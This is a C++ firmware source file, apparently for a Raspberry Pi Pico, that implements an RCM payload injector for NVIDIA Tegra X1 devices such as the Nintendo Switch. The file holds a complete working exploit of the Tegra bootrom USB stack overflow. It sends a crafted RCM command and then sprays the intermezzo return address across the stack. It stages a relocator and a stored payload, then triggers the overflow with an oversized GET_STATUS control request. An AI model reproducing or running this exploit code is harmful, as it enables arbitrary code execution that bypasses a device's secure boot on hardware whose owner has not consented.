#include "rcm.h"

#include <atomic>
#include <cstring>

#include "tusb.h"
#undef TU_ATTR_WEAK
#define TU_ATTR_WEAK
#include "host/usbh_pvt.h"
#include "payload_manager.h"
#include "pico/stdlib.h"

extern "C" {
extern const uint8_t _binary_mrx_intermezzo_bin_start[];
extern const uint8_t _binary_mrx_intermezzo_bin_end[];
}

namespace {

constexpr uint16_t kRcmVid = 0x0955;
constexpr uint16_t kRcmPid = 0x7321;
constexpr uint8_t kRcmBulkOut = 0x01;
constexpr uint8_t kRcmBulkIn = 0x81;
constexpr size_t kRcmCommandSize = 680;
constexpr uint32_t kRcmMaximumCommandLength = 0x30298;
constexpr uint32_t kStackOverwriteLength = 0xF000;
constexpr uint32_t kIntermezzoAddress = 0x4001F000;
constexpr size_t kUsbBlockSize = 0x1000;
constexpr size_t kPayloadChunkSize = 4096;
constexpr uint32_t kControlTriggerLength = 0x7000;
constexpr uint32_t kTransferTimeoutMs = 2000;
constexpr uint32_t kRelocationLengthMarker = 0x4D52584C;

std::atomic<uint8_t> g_rcm_device_address{0};
std::atomic<bool> g_rcm_mounted{false};
std::atomic<bool> g_xfer_done{false};
std::atomic<uint32_t> g_xfer_result{XFER_RESULT_INVALID};
std::atomic<uint32_t> g_xfer_actual_length{0};

alignas(4) uint8_t g_usb_block[kUsbBlockSize];
alignas(4) uint8_t g_payload_chunk[kPayloadChunkSize];
alignas(4) uint8_t g_word_chunk[kPayloadChunkSize];
alignas(4) uint8_t g_rcm_device_id[16];
alignas(4) uint8_t g_control_response[kControlTriggerLength];
alignas(4) tusb_control_request_t g_control_request;
uint32_t g_bytes_queued;
size_t g_block_fill;
uint8_t g_current_buffer;
uint8_t g_bulk_endpoint_out;
uint8_t g_bulk_endpoint_in;
uint8_t g_rcm_interface;

void transfer_complete(tuh_xfer_t *xfer) {
    g_xfer_actual_length.store(xfer->actual_len, std::memory_order_relaxed);
    g_xfer_result.store(static_cast<uint32_t>(xfer->result), std::memory_order_relaxed);
    g_xfer_done.store(true, std::memory_order_release);
}

bool wait_for_transfer(uint32_t timeout_ms, xfer_result_t *result_out,
                       uint32_t *actual_length_out) {
    const absolute_time_t deadline = make_timeout_time_ms(timeout_ms);
    while (!g_xfer_done.load(std::memory_order_acquire)) {
        if (time_reached(deadline)) return false;
        tight_loop_contents();
    }
    if (result_out != nullptr) {
        *result_out = static_cast<xfer_result_t>(g_xfer_result.load(std::memory_order_relaxed));
    }
    if (actual_length_out != nullptr) {
        *actual_length_out = g_xfer_actual_length.load(std::memory_order_relaxed);
    }
    return true;
}

bool transfer_bulk(uint8_t endpoint, uint8_t *buffer, uint16_t length) {
    const uint8_t dev_addr = g_rcm_device_address.load(std::memory_order_acquire);
    if (dev_addr == 0 || !g_rcm_mounted.load(std::memory_order_acquire)) return false;

    g_xfer_done.store(false, std::memory_order_release);
    tuh_xfer_t xfer = {
        .daddr = dev_addr,
        .ep_addr = endpoint,
        .result = XFER_RESULT_INVALID,
        .buflen = length,
        .buffer = buffer,
        .complete_cb = transfer_complete,
        .user_data = 0,
    };
    if (!tuh_edpt_xfer(&xfer)) return false;

    xfer_result_t result = XFER_RESULT_INVALID;
    uint32_t actual_length = 0;
    return wait_for_transfer(kTransferTimeoutMs, &result, &actual_length) &&
           result == XFER_RESULT_SUCCESS && actual_length == length;
}

bool send_usb_block(const uint8_t block[kUsbBlockSize]) {
    if (!transfer_bulk(g_bulk_endpoint_out,
                       const_cast<uint8_t *>(block),
                       static_cast<uint16_t>(kUsbBlockSize))) {
        return false;
    }
    g_current_buffer = static_cast<uint8_t>(1u - g_current_buffer);
    g_bytes_queued += static_cast<uint32_t>(kUsbBlockSize);
    return true;
}

bool send_rcm_device_id(void) {
    g_xfer_done.store(false, std::memory_order_release);
    if (!transfer_bulk(g_bulk_endpoint_in, g_rcm_device_id, sizeof(g_rcm_device_id))) {
        return false;
    }
    return true;
}

bool writer_flush_block(void) {
    if (g_block_fill != kUsbBlockSize) return false;
    if (!send_usb_block(g_usb_block)) return false;
    g_block_fill = 0;
    return true;
}

bool writer_bytes(const uint8_t *data, size_t length) {
    while (length > 0) {
        const size_t available = kUsbBlockSize - g_block_fill;
        const size_t count = length < available ? length : available;
        std::memcpy(g_usb_block + g_block_fill, data, count);
        g_block_fill += count;
        data += count;
        length -= count;
        if (g_block_fill == kUsbBlockSize && !writer_flush_block()) return false;
    }
    return true;
}

bool writer_zeroes(size_t length) {
    std::memset(g_payload_chunk, 0, sizeof(g_payload_chunk));
    while (length > 0) {
        const size_t count = length < sizeof(g_payload_chunk) ? length : sizeof(g_payload_chunk);
        if (!writer_bytes(g_payload_chunk, count)) return false;
        length -= count;
    }
    return true;
}

bool writer_word_repeated(uint32_t value, size_t length) {
    for (size_t i = 0; i < sizeof(g_word_chunk); i += sizeof(value)) {
        g_word_chunk[i + 0] = static_cast<uint8_t>(value);
        g_word_chunk[i + 1] = static_cast<uint8_t>(value >> 8);
        g_word_chunk[i + 2] = static_cast<uint8_t>(value >> 16);
        g_word_chunk[i + 3] = static_cast<uint8_t>(value >> 24);
    }
    while (length > 0) {
        const size_t count = length < sizeof(g_word_chunk) ? length : sizeof(g_word_chunk);
        if (!writer_bytes(g_word_chunk, count)) return false;
        length -= count;
    }
    return true;
}

bool patch_intermezzo(uint8_t *blob, size_t blob_size, uint32_t copy_length) {
    size_t match_count = 0;
    for (size_t i = 0; i + sizeof(uint32_t) <= blob_size; ++i) {
        const uint32_t value = static_cast<uint32_t>(blob[i]) |
                               (static_cast<uint32_t>(blob[i + 1]) << 8) |
                               (static_cast<uint32_t>(blob[i + 2]) << 16) |
                               (static_cast<uint32_t>(blob[i + 3]) << 24);
        if (value == kRelocationLengthMarker) {
            blob[i + 0] = static_cast<uint8_t>(copy_length);
            blob[i + 1] = static_cast<uint8_t>(copy_length >> 8);
            blob[i + 2] = static_cast<uint8_t>(copy_length >> 16);
            blob[i + 3] = static_cast<uint8_t>(copy_length >> 24);
            ++match_count;
        }
    }
    return match_count == 1;
}

bool read_payload_chunk(uint32_t id, uint64_t offset, size_t length) {
    size_t bytes_read = 0;
    return payload_read_chunk(id, offset, g_payload_chunk, length, &bytes_read) == STORAGE_OK &&
           bytes_read == length && writer_bytes(g_payload_chunk, length);
}

uint8_t *copy_intermezzo(size_t *size_out) {
    const size_t blob_size = static_cast<size_t>(_binary_mrx_intermezzo_bin_end -
                                                 _binary_mrx_intermezzo_bin_start);
    if (blob_size == 0 || blob_size > 256) return nullptr;

    static uint8_t patched_blob[256];
    std::memcpy(patched_blob, _binary_mrx_intermezzo_bin_start, blob_size);
    *size_out = blob_size;
    return patched_blob;
}

bool rcm_driver_open(uint8_t, uint8_t dev_addr,
                     tusb_desc_interface_t const *interface_desc, uint16_t max_len) {
    uint16_t vid = 0;
    uint16_t pid = 0;
    if (!tuh_vid_pid_get(dev_addr, &vid, &pid) || vid != kRcmVid || pid != kRcmPid ||
        interface_desc->bInterfaceClass != TUSB_CLASS_VENDOR_SPECIFIC) {
        return false;
    }

    uint8_t const *descriptor = reinterpret_cast<uint8_t const *>(interface_desc);
    uint16_t consumed = interface_desc->bLength;
    uint8_t endpoint_in = 0;
    uint8_t endpoint_out = 0;
    while (consumed + 2 <= max_len) {
        descriptor = tu_desc_next(descriptor);
        const uint8_t desc_len = descriptor[0];
        const uint8_t desc_type = descriptor[1];
        if (desc_len < 2 || consumed + desc_len > max_len ||
            desc_type == TUSB_DESC_INTERFACE) {
            break;
        }
        if (desc_type == TUSB_DESC_ENDPOINT && desc_len >= sizeof(tusb_desc_endpoint_t)) {
            auto const *endpoint = reinterpret_cast<tusb_desc_endpoint_t const *>(descriptor);
            if (endpoint->bmAttributes.xfer == TUSB_XFER_BULK) {
                if (endpoint->bEndpointAddress == kRcmBulkIn) endpoint_in = kRcmBulkIn;
                if (endpoint->bEndpointAddress == kRcmBulkOut) endpoint_out = kRcmBulkOut;
            }
        }
        consumed = static_cast<uint16_t>(consumed + desc_len);
    }

    if (endpoint_in != kRcmBulkIn || endpoint_out != kRcmBulkOut) return false;

    descriptor = reinterpret_cast<uint8_t const *>(interface_desc);
    consumed = interface_desc->bLength;
    while (consumed + 2 <= max_len) {
        descriptor = tu_desc_next(descriptor);
        const uint8_t desc_len = descriptor[0];
        const uint8_t desc_type = descriptor[1];
        if (desc_len < 2 || consumed + desc_len > max_len || desc_type == TUSB_DESC_INTERFACE) break;
        if (desc_type == TUSB_DESC_ENDPOINT && desc_len >= sizeof(tusb_desc_endpoint_t)) {
            auto const *endpoint = reinterpret_cast<tusb_desc_endpoint_t const *>(descriptor);
            if (endpoint->bmAttributes.xfer == TUSB_XFER_BULK &&
                !tuh_edpt_open(dev_addr, endpoint)) {
                return false;
            }
        }
        consumed = static_cast<uint16_t>(consumed + desc_len);
    }

    g_bulk_endpoint_in = endpoint_in;
    g_bulk_endpoint_out = endpoint_out;
    g_rcm_interface = interface_desc->bInterfaceNumber;
    g_rcm_device_address.store(dev_addr, std::memory_order_release);
    return true;
}

bool rcm_driver_set_config(uint8_t dev_addr, uint8_t interface_number) {
    if (dev_addr != g_rcm_device_address.load(std::memory_order_acquire) ||
        interface_number != g_rcm_interface) {
        return false;
    }
    usbh_driver_set_config_complete(dev_addr, interface_number);
    g_rcm_mounted.store(true, std::memory_order_release);
    return true;
}

bool rcm_driver_xfer(uint8_t, uint8_t, xfer_result_t, uint32_t) {
    return true;
}

void rcm_driver_close(uint8_t dev_addr) {
    if (dev_addr == g_rcm_device_address.load(std::memory_order_acquire)) {
        g_rcm_mounted.store(false, std::memory_order_release);
        g_rcm_device_address.store(0, std::memory_order_release);
    }
}

bool rcm_driver_init(void) { return true; }
bool rcm_driver_deinit(void) { return true; }

const usbh_class_driver_t g_rcm_driver = {
    .name = "MRX RCM",
    .init = rcm_driver_init,
    .deinit = rcm_driver_deinit,
    .open = rcm_driver_open,
    .set_config = rcm_driver_set_config,
    .xfer_cb = rcm_driver_xfer,
    .close = rcm_driver_close,
};

bool send_control_trigger(uint8_t dev_addr) {
    g_control_request = {};
    g_control_request.bmRequestType_bit.recipient = TUSB_REQ_RCPT_ENDPOINT;
    g_control_request.bmRequestType_bit.type = TUSB_REQ_TYPE_STANDARD;
    g_control_request.bmRequestType_bit.direction = TUSB_DIR_IN;
    g_control_request.bRequest = TUSB_REQ_GET_STATUS;
    g_control_request.wValue = 0;
    g_control_request.wIndex = 0;
    g_control_request.wLength = static_cast<uint16_t>(kControlTriggerLength);

    g_xfer_done.store(false, std::memory_order_release);
    tuh_xfer_t xfer = {
        .daddr = dev_addr,
        .ep_addr = 0,
        .result = XFER_RESULT_INVALID,
        .setup = &g_control_request,
        .buffer = g_control_response,
        .complete_cb = transfer_complete,
        .user_data = 0,
    };
    if (!tuh_control_xfer(&xfer)) return false;

    xfer_result_t result = XFER_RESULT_INVALID;
    uint32_t actual_length = 0;
    return wait_for_transfer(kTransferTimeoutMs, &result, &actual_length) &&
           result == XFER_RESULT_SUCCESS && actual_length == kControlTriggerLength;
}

}

extern "C" usbh_class_driver_t const *usbh_app_driver_get_cb(uint8_t *driver_count) {
    *driver_count = 1;
    return &g_rcm_driver;
}

mrx_rcm_result_t mrx_rcm_inject_selected(void) {
    if (!g_rcm_mounted.load(std::memory_order_acquire)) return MRX_RCM_ERR_NO_DEVICE;

    uint32_t payload_id = 0;
    if (payload_get_selected(&payload_id) != STORAGE_OK || payload_id == 0) {
        return MRX_RCM_ERR_NO_SELECTION;
    }

    PayloadInfo info = {};
    if (payload_get_info(payload_id, &info) != STORAGE_OK) return MRX_RCM_ERR_STORAGE;
    if (info.size == 0 || info.size > 0x20000u) return MRX_RCM_ERR_INVALID_PAYLOAD;

    bool hash_matches = false;
    if (payload_verify(payload_id, &hash_matches, nullptr) != STORAGE_OK) {
        return MRX_RCM_ERR_STORAGE;
    }
    if (!hash_matches) return MRX_RCM_ERR_INVALID_PAYLOAD;

    size_t intermezzo_size = 0;
    uint8_t *intermezzo = copy_intermezzo(&intermezzo_size);
    if (intermezzo == nullptr || intermezzo_size >= 0x1000u) {
        return MRX_RCM_ERR_INVALID_PAYLOAD;
    }

    const uint32_t copy_length = static_cast<uint32_t>((info.size + 3u) & ~3u);
    if (!patch_intermezzo(intermezzo, intermezzo_size, copy_length)) {
        return MRX_RCM_ERR_INVALID_PAYLOAD;
    }

    const uint64_t payload_offset = 0x10000u;
    const uint64_t unpadded_size = kRcmCommandSize + payload_offset + copy_length;
    const uint64_t transmitted_size =
        (unpadded_size + (kUsbBlockSize - 1u)) & ~(static_cast<uint64_t>(kUsbBlockSize) - 1u);
    if (transmitted_size > kRcmMaximumCommandLength) return MRX_RCM_ERR_INVALID_PAYLOAD;

    if (!send_rcm_device_id()) return MRX_RCM_ERR_TRANSFER;

    g_bytes_queued = 0;
    g_block_fill = 0;
    g_current_buffer = 0;

    uint8_t command[kRcmCommandSize] = {};
    command[0] = static_cast<uint8_t>(kRcmMaximumCommandLength);
    command[1] = static_cast<uint8_t>(kRcmMaximumCommandLength >> 8);
    command[2] = static_cast<uint8_t>(kRcmMaximumCommandLength >> 16);
    command[3] = static_cast<uint8_t>(kRcmMaximumCommandLength >> 24);
    if (!writer_bytes(command, sizeof(command)) ||
        !writer_word_repeated(kIntermezzoAddress, kStackOverwriteLength) ||
        !writer_bytes(intermezzo, intermezzo_size)) {
        return MRX_RCM_ERR_TRANSFER;
    }

    const size_t staged_length = kStackOverwriteLength + intermezzo_size;
    const size_t staging_padding = static_cast<size_t>(payload_offset - staged_length);
    if (!writer_zeroes(staging_padding)) return MRX_RCM_ERR_TRANSFER;

    uint64_t offset = 0;
    while (offset < info.size) {
        const size_t count = static_cast<size_t>(
            (info.size - offset) < kPayloadChunkSize ? (info.size - offset) : kPayloadChunkSize);
        if (!read_payload_chunk(payload_id, offset, count)) return MRX_RCM_ERR_STORAGE;
        offset += count;
    }
    if (copy_length > info.size && !writer_zeroes(static_cast<size_t>(copy_length - info.size))) {
        return MRX_RCM_ERR_TRANSFER;
    }
    const size_t tail_padding = static_cast<size_t>(transmitted_size - unpadded_size);
    if (tail_padding > 0 && !writer_zeroes(tail_padding)) return MRX_RCM_ERR_TRANSFER;
    if (g_block_fill != 0) return MRX_RCM_ERR_TRANSFER;


    if (g_current_buffer != 1u) {
        std::memset(g_usb_block, 0, sizeof(g_usb_block));
        if (!send_usb_block(g_usb_block)) return MRX_RCM_ERR_TRANSFER;
    }

    const uint8_t dev_addr = g_rcm_device_address.load(std::memory_order_acquire);
    if (dev_addr == 0 || !g_rcm_mounted.load(std::memory_order_acquire)) {
        return MRX_RCM_ERR_TRANSFER;
    }

    (void)send_control_trigger(dev_addr);
    return MRX_RCM_ERR_TRIGGER_UNCONFIRMED;
}
